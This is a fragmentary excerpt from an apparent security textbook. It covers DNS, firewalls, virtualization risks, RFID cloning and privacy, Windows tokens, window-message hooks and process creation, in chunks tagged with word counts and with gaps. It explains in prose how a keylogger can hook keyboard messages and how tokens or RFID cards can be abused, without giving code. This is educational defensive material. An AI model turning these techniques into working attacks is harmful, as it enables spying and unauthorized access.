the domain, and a time-to-live (TTL) value. The TTL specifies the 
number of seconds for which the data in the record are valid. This value 
is the key to the caching system described above; as without a TTL, the 
servers would not know how long any particular data could be cached.
[Word Count: 51]

Organizations that want to issue takedown requests for these 
domains need to understand how the DNS works so they can take the 
correct actions.
[Word Count: 24]

Exhibit 1-12  A long phishing domain appearing to belong to CitiBank.
[Word Count: 11]

The next generation of security firewalls improved on these filter-
enabled routers. During the early 1990s, companies such as DEC, 
Check Point, and Bell Labs developed new features for firewalls. 
Check Point, for instance, eased the technical expertise requirements 
for configuring firewalls by providing user-friendly interfaces while 
at the same time providing administrators with new configuration 
options for refined rule sets.
[Word Count: 61]

1.1.6.2  What’s in a Name?  The question remains: what exactly is a 
firewall? Firewalls are network devices or software that separates one 
trusted network from an untrusted network (e.g., the Internet) by means 
of rule-based filtering of network traffic as depicted in Exhibit 1-13. 
Despite the broad definition of a firewall, the specifics of what makes
[Word Count: 56]

up a firewall depend on the type of firewall. There are three basic types 
of firewall: packet-filtering firewalls, stateful firewalls, and application 
gateway firewalls. While each of these different firewall types performs 
the same basic operation of filtering undesirable traffic, they go about the 
task in different manners and at different levels of the network stack.14
[Word Count: 56]

While Exhibit 1-13 identifies the firewall as a separate physical device 
at the boundary between an untrusted and trusted network, in reality a 
firewall is merely software. This does not mean that physical, separate 
devices are not firewalls, but merely that these devices are simply com­
puters running firewall software. Host-based firewalls have found their 
way into most operating systems. Windows XP and later versions have 
a built-in firewall called the Windows Firewall.15 Linux- and Unix-
based computers use ipchains16 or iptables17 (depending on the age and 
type of the operating system [OS]) to perform firewall functionality;
[Word Count: 97]

Inbound:
Allow SSH
Deny RDP
Deny P2P
Allow HTTP
[Word Count: 9]

Exhibit 1-13  A basic firewalled network.
[Word Count: 6]

therefore, it is important to understand that firewalls can exist at differ­
ent locations within a network, not just at the perimeter of a network.
[Word Count: 25]

ALLOW host 1.1.1.1 to host 2.2.2.2
DENY ALL
[Word Count: 8]

On the other hand, if the packet originated from 2.2.2.2 with a 
destination of 3.3.3.3, the firewall would stop the packet from travers­
ing the network any further due to the DENY ALL rule. Generally, 
firewalls contain an implied DENY ALL rule. If the administrator 
fails to include the DENY ALL rule, the firewall, after exhausting all 
of the rules in the filter set, will default to the DENY ALL rule and 
deny the traffic, since it did not match any defined rule.
[Word Count: 83]

Packet-filtering firewalls can also expand on the basic principle 
of IP-address-only filtering by looking at the Transmission Control 
Protocol (TCP) or User Diagram Protocol (UDP) source and destina­
tion ports. In this mode, the firewall operates in nearly the same fashion 
as the packet-filtering firewalls operating on the IP address. For a packet 
to pass through the firewall, the source IP and port and the destination 
IP and port must match at least one rule in the filter list. More advanced 
routers and even some higher-end switches offer this functionality.
[Word Count: 90]

To limit the exposure of a system to only necessary ports, adminis-
trators use port filtering. For example, a collocated Web server (a server 
hosted by a third party) will typically open HTTP and HTTPS ports 
for a customer’s server to the Internet, but the administrator will restrict 
the secure shell (SSH) port on the firewall to only allow connections 
from the hosting company’s network. This technique combines the 
use of IP and port filtering to allow administration of resources from
[Word Count: 81]

specific networks (e.g., the company’s network or trusted third-party 
networks) while allowing public services (e.g., HTTP) the necessary 
Internet exposure.
[Word Count: 20]

ALLOW host 1.1.1.1 to host 2.2.2.2
DENY ALL
ALLOW host 3.3.3.3 to 1.1.1.1
[Word Count: 13]

In this example, the firewall administrator has placed an ALLOW 
rule after the DENY ALL rule. This situation would prevent the pro­
cessing of the last ALLOW rule.
[Word Count: 28]

1.1.6.4  Stateful Firewalls  Simple packet-filtering firewalls suffer from 
one significant downside: they do not take into consideration the state 
of a connection, only the endpoints of the connection. Stateful firewalls 
allow only properly established connections to traverse the firewall’s 
borders. While packet filtering is still a key element of these firewalls, 
the firewall also pays attention to the state of the connection.
[Word Count: 62]

Once the firewall allows a successful connection between two hosts 
using the three-way TCP handshake,18 the firewall records the occur-
rence of a valid session between the two hosts. If an attacker attempts 
to generate an invalid session, such as by sending an ACK (acknowl-
edgment) prior to sending a SYN (synchronize), the firewall identifies 
the packet as an invalid state and subsequently blocks the connection.
[Word Count: 66]

After a host establishes a valid session, however, communication 
between the two hosts can occur unrestricted and without requiring 
the firewall to rerun the list of packet filters.
[Word Count: 28]

It is the ability to determine the order and state of a communication 
session that allows stateful firewalls to make faster determinations 
about incoming packets. Of course, it is important that these firewalls 
do not run out of memory from storing the state of stale connections. 
To avoid this problem, stateful firewalls will purge state information 
for sessions that have “gone quiet” for a significantly long period. Once 
a session has expired, the next packet originating from either host will 
result in the firewall verifying the packet against packet-filtering rules 
and the establishment of a new session.
[Word Count: 97]

These proxies also prevent unknown protocols from passing through. 
For example, a properly configured HTTP proxy will not understand 
an SSH connection and will prevent the establishment of the connec-
tion (see Exhibit 1-14). This level of packet inspection cannot occur 
with either a packet-filtering or stateful firewall, as neither firewall 
type looks at the application layer of the network stack. By identifying 
improperly constructed packets for a given protocol, the application 
gateway firewalls may prevent some types of protocol-specific attacks; 
however, if a particular protocol’s definition allows for such a vulner-
ability, the gateway will provide no protection.
[Word Count: 99]

1.1.6.6  Conclusions  Firewalls come in a variety of forms, from simple 
packet filtering to the more complex proxy. The topic of firewalls 
is complex and extremely well documented. Authors from the IT
[Word Count: 32]

security community have dedicated entire books to the subject of 
designing, administering, and implementing firewalls. To understand 
the importance of firewalls, the minute details of their operation can 
be avoided, but it is critical to understand the high-level concepts of 
their operation. Understanding the basics of how firewalls process 
traffic and how that processing prevents unwanted intrusions is the 
key to understanding the security of firewalls.
[Word Count: 66]

Like antivirus solutions, the impression that firewalls will stop all 
evils of the Internet is overstated at best. Firewalls provide a single 
layer of defense in the larger scheme of defense in depth. While fire-
walls can reduce the attack surface of a server by blocking unnecessary 
ports from the Internet at large, firewalls cannot protect resources 
that are vulnerable to specific vulnerabilities such as buffer overflows 
and privilege escalation attacks.
[Word Count: 71]

Technology has advanced to the point that server consolidation through 
virtualization can help tame the cost of infrastructure deployment and
[Word Count: 20]

Exhibit 1-14  An application gateway filtering known and unknown protocols.
[Word Count: 10]

operation by reducing the number of servers required to perform the 
same level of operational standards, given that enterprises typically 
underutilize the full capacity available in physical servers. This section 
explores the history, concepts, and technologies of virtualization.
[Word Count: 38]

1.1.7.1  In the Beginning, There Was Blue  …  Infrastructure resources 
such as servers are expensive. This expense comes from the cost of the 
physical hardware, the cost associated with supplying power to the 
servers, the cost to cool and maintain the proper operating environ­
ment for the servers, and the cost of administering the servers. For 
large infrastructures with deployments of tens to tens of thousands of 
servers, the cost of running these servers can quickly balloon, result­
ing in extremely high operational costs. To alleviate some of these 
administrative costs, organizations are turning to virtualization.
[Word Count: 96]

For decades, the use of virtual machines inside mainframes has been 
common practice. The use of these virtual machines gives mainframes 
the ability to act not as a single machine but as multiple machines 
acting simultaneously. Each virtual machine is capable of running its 
operating system independent of the other virtual machines running 
on the same physical machine. In this sense, the mainframe effec-
tively turns one machine into multiple machines. Mainframes only 
represent the beginning of the virtualization technology and are by 
no means the only systems that provide the service.
[Word Count: 92]

1.1.7.2  The Virtualization Menu  Virtualization comes in many forms 
such as platform and application virtualization. The most recognized 
form of virtualization is platform virtualization and is the method
[Word Count: 28]

of virtualization detailed in this section. Platform virtualization is a 
broad category that contains several variations on a theme. The most 
predominant platform virtualization techniques19 include full virtu­
alization, hardware-assisted virtualization, paravirtualization, and 
operating system virtualization. Each of these techniques accom­
plishes the task of virtualization in different ways, but each results 
in a single machine performing the function of multiple machines 
working at the same time.
[Word Count: 67]

Virtualization systems consist of several key components: a VMM, 
physical hardware, virtual hardware, virtual operating systems, and a 
host (or real) operating system. Exhibit 1-15 illustrates the relation-
ship of these components. The key component, the component that 
makes virtualization possible, is the VMM.
[Word Count: 44]

Real
I/O
Virtual
I/O
Real
Memory
Virtual
Memory
Real
CPU
Virtual
CPU
[Word Count: 12]

Virtual Machine Monitor
Application
Application
[Word Count: 5]

Exhibit 1-15  The relationship between virtual machines and a host machine.
[Word Count: 11]

The VMM is the application layer between the various virtual 
machines and the underlying physical hardware. The VMM provides 
the framework for the virtual machine by creating the necessary vir­
tual components. These components include, but are not limited to, 
hardware devices like network interface cards (NICs), sound cards, 
keyboard and mouse interfaces, a basic input–output system (BIOS), 
and virtual processors. It is the responsibility of the VMM to mate 
the needs of the virtual machine with the available physical resources. 
The manner in which the VMM handles these needs dictates the type 
of virtualization technique employed.
[Word Count: 97]

1.1.7.3  Full Virtualization  Full virtualization, as the name implies, 
strives to provide the most realistic, completely accurate virtual rep­
resentation of the real hardware. For x86-based architecture, this is 
problematic. The x86 family of processors offers different levels of 
privilege to running code. Known as rings, these levels of protection 
are in place to prevent lower privileged code, such as that found in a 
standard application, from interfering or corrupting higher privileged 
code such as the kernel of the operating system.
[Word Count: 81]

To make virtualization faster and more efficient, virtual machine 
applications such as VMware utilize the host machine’s processor to 
execute instructions requested by the virtual machine. For example, 
if the virtual machine requests to move memory from one location to 
another location, the VMM would execute the instructions natively 
on the host machine and post the result to the virtual machine. This 
requires significantly less processor time and fewer resources than 
emulating the CPU, resulting in a faster virtual machine.
[Word Count: 80]

1.1.7.4  Getting a Helping Hand from the Processor  As the virtualiza­
tion technology has matured from a software perspective, the hard­
ware manufacturers have begun to show interest in the field, which 
opens the door for hardware-assisted virtualization. Recently, Intel 
and AMD released newer x86-based processors that incorporate fea­
tures known as processor extensions to aid virtualization. The processor 
extensions give Intel’s Virtualization Technology (VT)20 and AMD’s 
AMD-V21 chip-level solutions to the issue of privileged x86 instruc­
tions that the VMM cannot virtualize. These technologies provide an 
even more privileged layer than ring-0 in which the VMM resides.
[Word Count: 98]

conditions that would cause instability between the two competing 
operating systems.
[Word Count: 11]

Hardware-assisted virtualization is an extension of full virtualiza­
tion. Like full virtualization, hardware-assisted virtualization pro­
vides the virtual machine with a completely virtual hardware system. 
The advantage of hardware-assisted virtualization is the possibility 
that with a suitably designed system, the CPU can more efficiently 
handle instructions generated from the guest operating system that 
would otherwise cause instability.
[Word Count: 57]

The obvious disadvantage of paravirtualization is the required 
modification to the virtual machine’s operating system. For closed-
source operating systems, it is difficult to modify the kernel fully to 
meet the requirements of paravirtualization. Most paravirtualiza­
tion-based virtual machines run modified Linux operating systems. 
An example of a paravirtualization system is the open-source Xen22 
application for the Linux operating system. Commercial applica-
tions such as VMware support the paravirtualization mode, but the 
choice of the virtual machine’s operating system limits the useful-
ness of paravirtualization.23
[Word Count: 85]

1.1.7.6  Use What You Have  Operating system-assisted virtualiza-
tion differs dramatically from the underlying concept that ties full
[Word Count: 18]

virtualization, paravirtualization, and hardware-assisted virtualiza­
tion together. Instead of providing a realistic virtualized machine 
complete with dedicated I/O, memory, and processors, operating 
system-assisted virtualization provides an application with the illu­
sion of a dedicated operating system. This virtualization technique is 
common on Linux- and Unix-based systems via chroot,24 FreeVPS,25 
FreeBSD Jail,26 and others.
[Word Count: 53]

Whereas the other virtualization techniques provide a virtual 
machine capable of supporting ring-0 instructions, operating system-
assisted virtualization provides only user mode resources. This means 
that the virtual environment is unable to run privileged instructions, 
which require ring-0. This type of system allows a single operat­
ing system instance to run multiple applications in isolation while 
still providing them with the necessary operating system resources 
such as disk and network access. Exhibit 1-16 depicts this form of 
virtualization.
[Word Count: 78]

1.1.7.7  Doing It the Hard Way  Emulators operate on the same basic 
principles as virtualization systems except that the requirement that 
the host machine must match the same basic architecture as the 
virtual machine does not limit emulators. Emulators, as the name 
implies, emulate all aspects of the virtual machine’s hardware. While 
virtualization systems will offload the execution of a virtual machine’s 
operating systems or applications to the host machine’s processor, 
emulators do not. Emulation systems translate the virtual machine’s 
instructions into instructions that can run on the host machine.
[Word Count: 90]

Exhibit 1-16  Operating system-assisted virtualization.
[Word Count: 5]

Emulators are not strictly for dissimilar architectures. Emulators 
can run virtual machines of the same architecture as the host 
machine. VMware, if specifically configured to do so, can emulate 
the x86 architecture including the CPU within a virtual machine. 
The advantage of this behavior is to provide an even more realistic 
virtual environment that does not rely on the translation of certain 
ring-0 instructions.
[Word Count: 64]

1.1.7.8  Biting the Hand That Feeds  Virtualization of infrastructure 
resources may reduce the number of physical servers required; at 
the same time, it is important to understand that virtualization may 
introduce risks. While many virtualization systems attempt to provide 
rigid boundaries between the host system and the virtual machines 
running on the host system, the possibility exists that malicious actors 
may attempt to breach the boundaries. As virtualization systems have 
gained popularity, attackers have begun focusing on the weaknesses 
within these systems.
[Word Count: 82]

Regardless of the virtualization method, the fact remains that the 
virtual machine’s operating system and its associated applications run 
on the host system at some point in time. When the VMM gives the 
virtual machine access to physical resources such as video devices, 
the possibility exists for the separation between the virtual and host 
machine to crumble. In 2009, researchers from Immunity released a 
presentation28 at Black Hat 2009 in which they demonstrated that 
from within a virtual machine, an attacker could gain access to the 
host machine’s memory. Similarly, in 2009, researchers at Core Labs29
[Word Count: 96]

released an advisory describing a method for accessing the host oper­
ating system from within a virtual machine.
[Word Count: 18]

1.1.7.9  Conclusion  Virtualization has many advantages ranging from 
server consolidation to program isolation. While the technology has 
been available in some form for decades, advancements in modern 
computing hardware have led to a more widespread adaptation of the 
technology. Even at its current level of development, virtualization is 
already making major inroads into the IT community. Virtualization 
is a key component of the recent influx of new cloud-computing tech­
nologies currently on the market. The growth of the virtualization 
market is far from reaching its peak.
[Word Count: 86]

Before deploying a large virtualized infrastructure, it is important to 
understand the risks associated with virtualization. When the bound-
ary between a virtual machine and a host machine becomes transpar-
ent (through vulnerabilities), the risk of significant data exposure and 
system compromise increases dramatically. Classifying the data and 
types of virtual machines that run on the same physical machine can 
reduce this exposure.
[Word Count: 63]

At the 20XX DEFCON conference, Chris Paget of H4RDW4RE 
LLC presented his talk on debunking the myths around radio-
[Word Count: 19]

frequency identification (RFID). While many organizations use these 
devices for authentication, they often are not aware of how the tech­
nology works or how secure it is. In this section, RFID and the secu­
rity and privacy concerns around the technology are explained.
[Word Count: 43]

1.1.8.1  Identify What?  The data that an RFID tag contains vary 
depending on its application. The simplest and most common RFID 
tag is the electronic product code (EPC). EPCs are the RFID
[Word Count: 32]

equivalent of the bar code, and replacing barcodes is their primary 
function. EPC tags are passive RFID tags, and organizations fre­
quently integrate them into stickers. EPCs contain information simi­
lar to that found on Universal Product Codes (UPC) but can store 
much more information. The data stored in a typical EPC is a 96-bit 
number using the specification shown in Exhibit 1-17. The data stored 
in an EPC is merely this number, which has no value without the 
ability to decode its meaning. For product tags, this number repre­
sents the product’s manufacturer, type, and serial number.
[Word Count: 98]

Organizations and governments are using RFID tags to identify 
much more than common household products. Many organizations 
deploy RFID-equipped ID cards (commonly known as proxy cards, 
or proximity cards) that grant access to buildings and systems. In this
[Word Count: 38]

Shipping
Unit
Procter &
Gamble
Bounty ® Paper
Towels 15 Pack
Unique Serial Number
for Item
[Word Count: 16]

Unique Serial
Number
Item Reference
Company
Preﬁx
Filter
[Word Count: 8]

HEX representation from reader 30700048440663802E185523
Binary 0011000001110000000000000100100001000100000001100110010000000000000101110000110000101010100100011
URI representation after decoding urn:epc:tag:sgtin-96:3.0037000.06542.773346595
[Word Count: 12]

Exhibit 1-17  An example electronic product code (EPC). Source: http://assets.devx.com/arti-
clefigs/16814.jpg.
[Word Count: 11]

case, the number returned by the card corresponds to information 
about a specific individual stored in a database. If the card readers 
receive 0001 from John Doe’s card, the security system can look up 
this record in its database of users and allow or deny access to the 
secured area. Identifying people and authorizing access based on 
RFID tags are fundamentally different uses of the technology com­
pared to merely identifying products.
[Word Count: 72]

Obviously, there is no practical value in copying or cloning an EPC 
tag attached to a bag of potato chips, but copying an RFID access 
card can be quite valuable. If an access card worked like an EPC tag, 
it would always return the same 96-bit number. Anyone who could 
read the card could easily duplicate it and gain access to a building. To 
prevent this, another class of RFID tag, known as the contactless smart 
card (CSC), is much more complex than an EPC.
[Word Count: 85]

Similar to traditional smart cards, CSCs have the ability to store 
and process information. Rather than simply responding to each 
interrogation with the same number, CSCs use cryptography to hide 
their information and sometimes confirm the identity of the reader 
before divulging sensitive information.
[Word Count: 44]

Examples of CSC products are contactless credit cards issued by 
VISA, MasterCard, and American Express (see Exhibit 1-18); most 
access control badges; and the new U.S. electronic passport. The secu-
rity of these devices is incredibly important, because cloning or tam-
pering with them could allow an attacker to steal the owner’s money 
or identity without ever coming into contact with the owner.
[Word Count: 63]

1.1.8.2  Security and Privacy Concerns  The implementation of RFID 
security measures and the privacy concerns that wireless identity tags
[Word Count: 19]

Exhibit 1-18  An American Express card with CSC functionality.
[Word Count: 9]

Beyond the security concerns of identity and data theft, RFID tags 
also have ramifications for personal privacy. Because attackers can read 
the tags at a distance, they can read them without the user’s knowl-
edge. Even tags that do not contain any identifying information may 
identify a specific person when grouped with additional information.
[Word Count: 54]

Imagine that every shoe made contained an RFID tag that the man-
ufacturer could use to track inventory. This RFID tag alone is not a 
significant privacy concern, but if a person buys this shoe with a credit 
card, that specific RFID tag would then link to the buyer’s name in a 
retailer’s database. The retailer could then scan every user entering the 
store to see if the shopper was wearing any clothing associated with a
[Word Count: 76]

specific customer. The retailer could use this to display targeted adver­
tisements to each customer and track his or her location in each store, 
similar to the scenario played out in the film Minority Report.
[Word Count: 35]

Any individual or organization considering deploying RFID tech­
nology or carrying RFID-enabled devices should seriously study 
these concerns. Reading RFID tags at long distances allows attackers 
to track carriers without their knowledge. RFID wallets, which block 
signals transmitted by the devices, can provide protection against 
RFID readers. These wallets are typically made of metallic material 
through which radio frequency radiation cannot pass.
[Word Count: 62]

RFID tags have many advantages over technologies that require 
optical scans or physical contact. RFID readers can interrogate hun­
dreds of tags at a time to perform complete inventories in a fraction 
of the time required for hand counting; however, using these devices 
for identification and authentication requires the implementation of 
countermeasures to protect against cloning and modification.
[Word Count: 58]

1.2  Microsoft Windows Security Principles
[Word Count: 5]

Access tokens and control lists limit a user’s or program’s access to cer­
tain systems. Granting a user the least privilege required and devel­
oping programs to require minimal privileges are effective ways of 
containing the potential of full system compromise to privilege esca­
lation vulnerabilities.
[Word Count: 46]

1.2.1.1  Introduction  The inner workings of Microsoft Windows 
access tokens and access control lists for objects such as processes 
and threads are not widely understood. Windows uses access tokens 
(hereafter simply referred to as tokens) to determine if a program can 
perform an operation or interact with an object. In this section, we 
will explain the concept of Windows tokens and process and thread 
access control lists.
[Word Count: 67]

1.2.1.2  Concepts behind Windows Tokens  Tokens provide the security 
context for processes and threads when accessing objects on a sys-
tem. These objects, also known as securable objects, include all named
[Word Count: 31]

objects ranging from files and directories to registry keys. Tokens have 
four parts that include an identity, privileges, type, and access con­
trols. Conveniently, Windows tokens share similarities with a driver’s 
license at the conceptual level, and this idea draws analogies between 
the two. Exhibit 1-19 shows a license that is a visual representation of 
a token, and throughout this report, examples will attempt to bridge 
these two concepts together.
[Word Count: 70]

The second piece of a token’s identity is the concept of group mem-
berships. Several users can belong to the same group to simplify 
resource access management. For example, if a man visits a local com-
munity center that his family paid to attend, and an employee of the 
facility checks the man’s driver’s license to see if his family’s name is 
registered, the employee would let him use the facility if the names 
matched. Exhibit 1-19 shows the identity of the token by displaying
[Word Count: 85]

Exhibit 1-19  A Windows token represented as a driver’s license.
[Word Count: 10]

the user, group name, administrator, and ADMIN-8F05C726E, 
respectively, as it would on a driver’s license.
[Word Count: 15]

The privileges of a token specify certain operations that the holder 
of the token can perform. Two of the most familiar privileges are 
SeDebug and SeImpersonate. These privileges specify to the kernel 
what operations the user can perform with kernel objects before access 
control checks are considered.
[Word Count: 47]

The SeDebug privilege tells the kernel that the program holding 
this privilege can perform operations on processes and threads, which 
are objects a debugger would need to be able to access, without con­
sidering the access control restrictions on those objects. This concept 
is similar to the organ donor area on a driver’s license. If someone 
involved in a fatal car accident has properly indicated on his or her 
driver’s license that he or she is an organ donor, a hospital may remove 
the organs that the holder has designated without requiring the con­
sent of the person’s surviving relatives.
[Word Count: 100]

The SeImpersonate privilege allows the user to impersonate other 
users’ tokens. Typically seen granted to system services, this privi-
lege allows a user to acquire the access and permissions of some-
one else after the user authenticates. When used by a service, the 
service impersonates a client while accessing requested resources on 
the server. An example of this privilege would be if one person took 
another person’s driver’s license to use as his or her own when driving 
a car.
[Word Count: 80]

The token also has a type: it can be either a primary token or an 
impersonation token. Primary tokens identify processes, and imper-
sonation tokens identify threads. Other than this assignment, the only
[Word Count: 33]

other difference is that impersonation tokens also have an associated 
impersonation level.
[Word Count: 12]

The impersonation levels are anonymous, identification, imperson­
ation, and delegation. With an anonymous token at its processing whim, 
a program cannot identify the user of the token, nor can it impersonate 
the token. Anonymous tokens do little more than fill function require­
ments that a token exists. Anonymous tokens are like a motorist hav­
ing no driver’s license at all; the motorist is not identifiable.
[Word Count: 65]

Identification tokens are the next impersonation level. A program 
that possesses an identification token can inspect the user of the token, 
the group memberships of the token, and any privileges that the token 
has enabled. Identification tokens are useful when a program would 
like to perform its own access checks against a user and is not con­
cerned about allowing the operating system to check permissions. 
Identification tokens are like a motorist having a valid driver’s license; 
the motorist is identifiable.
[Word Count: 81]

An impersonation-level token allows a program to perform opera­
tions on behalf of the user of the token on the local system. The pro­
gram that possesses an impersonation-level token can call all of the 
Win32 application programming interfaces (APIs) and have the oper­
ating system perform access checks against the user. Impersonation 
tokens are like having the ability to change the picture and physical 
description on a driver’s license—one can allow anybody to assume 
the identity listed on the driver’s license.
[Word Count: 82]

1.2.1.3  Access Control Lists  Tokens have access control lists that 
describe the access that identities may request when accessing the 
token. These entries on the access control list either explicitly allow
[Word Count: 31]

or explicitly deny specific types of operations on the token. The token 
can allow or deny reading information from the token, writing infor­
mation to the token, and various other operations on the token to 
specific identities on the system. Together, these components form 
the basis behind tokens on Windows.
[Word Count: 50]

These access control lists apply to both processes and threads. They 
allow administration of the level of access granted to various groups 
and users. Process and thread control lists both offer standard access 
rights,32 but differ in the process- and thread-specific access rights.
[Word Count: 43]

Process-specific rights are a list of fourteen access permissions that 
apply to processes only. These rights include granular access controls 
that range from reading and writing to creating and terminating pro­
cesses. In addition to these granular permissions, Windows includes 
an all-encompassing right known as PROCESS_ALL_ACCESS, 
which permits all process-specific rights to a user.
[Word Count: 54]

Thread-specific rights are thirteen access rights that apply to threads 
only. The permissions allow interaction with threads and include 
rights to suspend, resume, and terminate threads, to name a few. Like 
the process-specific rights, THREAD_ALL_ACCESS permits all 
thread-specific rights to the user.
[Word Count: 42]

1.2.1.4  Conclusions  Access tokens and control lists limit the amount 
of access a user or program has to a system. Administrators should 
grant users the lowest level of privileges necessary to limit the amount 
of damage caused by compromise or a rogue user. Developers should 
also follow the least privilege stance while coding to reduce the impact 
of application misuse.
[Word Count: 60]

As far as an attacker is concerned, under normal circumstances, 
impersonation tokens with levels of impersonation and delegation are 
the most valuable because they increase an attacker’s access to systems. 
Therefore, access controls gained from proper token use can limit the 
exposure to privilege escalation vulnerabilities and lower the chances 
of full system compromise.
[Word Count: 54]

The window-messaging queue, which handles events such as mouse 
clicks and keyboard input, allows program windows on Microsoft oper­
ating systems to interact. Unfortunately, malicious software may also 
utilize this functionality and even add message hooks for capturing data 
and covert communication. Monitoring window message hooks can 
reveal malicious behavior such as key logging or graphical user input.
[Word Count: 58]

Programs that run on Microsoft operating systems with visible 
windows can accept and handle new events using window messaging 
(and the window-messaging queue). Processes may send these mes­
sages to communicate with other processes. For example, window 
messages allow users to interact with a window and input text or use 
the mouse. Sending a window message activates a message hook to 
execute code to handle the event.
[Word Count: 67]

Malicious and nonmalicious programs install message hooks to 
process message events. For instance, notepad.exe installs a message 
hook for keyboard (WH_KEYBOARD) and mouse (WH_MOUSE) 
messages to accept user input. Exhibit 1-20 shows message hooks that 
IceSword detects when the user opens notepad.exe.
[Word Count: 42]

SetWindowsHookEx is a Windows API function that initiates a 
hook for these messages. It allows the author to execute a new handling
[Word Count: 22]

Exhibit 1-20  IceSword is one tool for viewing message hooks.
[Word Count: 10]

function whenever the program receives a new message.33 Message 
hooks operate correctly under administrator and limited user accounts 
because they are necessary for users to interact with windows. Multiple 
processes can initialize hooks for the same message type (see Exhibit 
1-20). In cases where there are multiple hooks, the most recently ini­
tialized handling functions determine whether to pass the message to 
other handling functions for the same message type.
[Word Count: 70]

The system delivers messages using a first in, first out (FIFO) mes­
sage queue or by sending messages directly to a handling function. 
Each thread that has a graphical user interface (GUI) has its own mes­
sage queue, and there is a special message queue for system messages. 
Whenever a window does not accept these messages within a timeout 
period of a few seconds, the window may show “Not Responding” 
until the program handles the message.
[Word Count: 76]

1.2.2.1  Malicious Uses of Window Messages  Malicious code authors can 
use window messages and hooks for malicious purposes, including 
monitoring, covert communication, and exploiting vulnerabilities. 
One malicious use of window messages is for monitoring. An attacker 
can use the SetWindowsHookEx function with WH_KEYBOARD 
to install a key logger. The diagram in Exhibit 1-21 shows message 
hooks for the legitimate notepad application and an additional WH_
KEYBOARD message hook for a malicious key logger program, 
which tries to log all the keystrokes that the user types.
[Word Count: 85]

Malicious programs may also propagate via autorun with remov-
able devices and use WM_DEVICECHANGE hooks to determine 
when users insert new devices. Even programs running with limited
[Word Count: 27]

user permissions can intercept messages intended for other processes 
using these types of hooks.
[Word Count: 14]

Message Queue
Message Hooks
Handling Functions
[Word Count: 6]

Exhibit 1-21  Malicious and benign message hooks for a keylogger and notepad.
[Word Count: 12]

allow privilege escalation. According to Paget, the Microsoft fixes 
for this vulnerability only disable certain vulnerable functions but do 
little to prevent the privilege escalation vulnerabilities in the window-
messaging system.
[Word Count: 31]

Services that must run with increased permissions should not use 
interactive windows when they run as a limited user. Alternatives are 
available on Microsoft Windows platforms to perform interprocess 
communication and to limit the effects of privilege escalation attacks. 
Using named pipes and remote procedure calls (RPCs) are some alter­
natives that do not depend on support for sessions, and developers 
should use these instead of window messages to remain compatible 
with Windows Vista.36
[Word Count: 74]

Analysts and researchers should monitor window message hooks 
to identify behavior in running programs. Attackers may use window 
messaging for a variety of malicious purposes including monitoring, 
covert communication, and exploitation. Each window message hook 
may reveal functionality of unknown suspicious programs, such as 
graphical user input, key-logging functionality, spreading via remov-
able devices, and custom functionality.
[Word Count: 57]

Most people rarely consider the mechanics behind the scenes when 
running a program on their computers. Users have become accus-
tomed to the fact that by simply double clicking an executable or typ-
ing in a command, the operating system will magically load and run
[Word Count: 45]

the application desired. On the Windows system, this process is much 
more involved than simply clicking a button. The process by which 
the operating system loads, executes, and schedules programs is com­
plex. This section delves into the process of running a program from 
the moment the operating system begins loading the program into 
memory until the moment the program actually begins to execute.
[Word Count: 64]

A Windows executable is nothing more than a well-structured 
binary file that resides on a computer’s hard drive. It is not until the 
operating system loads the executable into memory, properly initial­
izes it, and generates a process context that the executable becomes an 
actual program. The procedure by which the operating system turns 
an executable image file into a running process varies slightly depend­
ing on which internal Windows application programming interface 
(API) function call loads the image.
[Word Count: 79]

The native Windows API contains a surprisingly large num­
ber of process generation functions, as seen in the top level of the 
hierarchy depicted in Exhibit 1-22. Ultimately, each of these func­
tions (with the exception of the CreateProcessWithLogon and 
CreateProcessWithToken) ends in a call to CreateProcessInternalW, 
which in turn calls NtCreateProcessEx. The exceptions to this trend 
are the CreateProcessWith… functions that ultimately end in a remote 
procedure call (RPC) via NdrClientCall. The RPC call also termi­
nates with a call to the internal NtCreateProcessEx function.
[Word Count: 86]

Regardless of the API function used to initiate the process cre­
ation, the basic steps to create the process are the same, since all func­
tions end in a call to NtCreateProcessEx. These eight steps, as defined 
by Microsoft Press’ “Windows Internals,” are displayed in order in 
Exhibit 1-22. These steps make up the core of the Windows pro-
gram execution system. Given the complexity of each of the steps, 
the remainder of this section will explore each step to provide a better 
understanding of what each step involves and how each contributes to 
the execution of a new process.
[Word Count: 100]

1.2.3.1  Validation of Parameters  The call to NtCreateProcessEx con-
tains a variety of parameters that the function must verify before it 
can attempt to load an executable image. NtCreateProcessEx must 
determine if these parameters are indeed valid and, if so, how they 
will affect subsequent operations. The API function allows the caller
[Word Count: 52]

Validate Parameters/
Determine Required
Windows Subsystem
[Word Count: 6]

Perform Subsystem
Speciﬁc Initialization
[Word Count: 4]

Complete Initialization
(Load Required DLLs)
[Word Count: 5]

class specified and uses this as the priority for the new process. If the 
caller to NtCreateProcessEx specifies that the only scheduling prior­
ity class allowed is Real-Time (a class that attempts to take as much of 
the CPU’s time as possible) and the caller of the function does not have 
sufficient scheduling privileges, NtCreateProcessEx will downgrade 
the request to High but will not prevent the call to NtCreateProcessEx 
from succeeding. When a program calls NtCreateProcessEx without 
an explicit scheduling priority defined, the function defaults to the 
Normal priority.
[Word Count: 89]

During the validation-of-parameters phase, NtCreateProcessEx 
assigns various handles and subsystems to address low-level events 
that may occur during the normal course of program execution. The 
function assigns exception-monitoring routines to handle exceptions 
that may occur in the program. The function also establishes whether a 
debugging system is required to handle debugging events. Finally, the 
function determines where the operating system will send data stream 
output if the program chooses not to use a console window (as would be 
the case with graphic applications). If the caller of NtCreateProcessEx
[Word Count: 88]

Determine Validity of Parameters 
to NtCreateProcessEX
[Word Count: 6]

Exhibit 1-23  Substeps of the validate parameters phase.
[Word Count: 8]

does not specify a Windows desktop for the process, the function 
associates the current user’s desktop with the process.
[Word Count: 19]

This prevents a process run by one user on a multiuser version 
of Windows (such as Windows 2003 or 2008) from starting a pro­
gram on the desktop of another user logged onto the same system by 
accident. Exhibit 1-23 details the components of the validation-of-
parameters phase.
[Word Count: 48]

If Necessary, Call CreateProcess to 
Handle Non-native Window32 File
[Word Count: 9]

determine if the image contains a Windows 32- or 64-bit image, an 
MS-DOS image, a POSIX image, or a Windows 16-bit image.
[Word Count: 22]

APPLICATION TYPE
EXTENSIONS
RESPONSIBLE WINDOWS IMAGE
[Word Count: 6]

Windows 32/64-bit
.exe
run directly via CreateProcess
[Word Count: 7]

MS-DOS
.exe, .com, .pif
run via ntvdm.exe
[Word Count: 7]

MS-DOS Command File
.bat, .cmd
run via cmd.exe/command.exe
[Word Count: 8]

Exhibit 1-25  A support image type by CreateProcess AP.
[Word Count: 9]

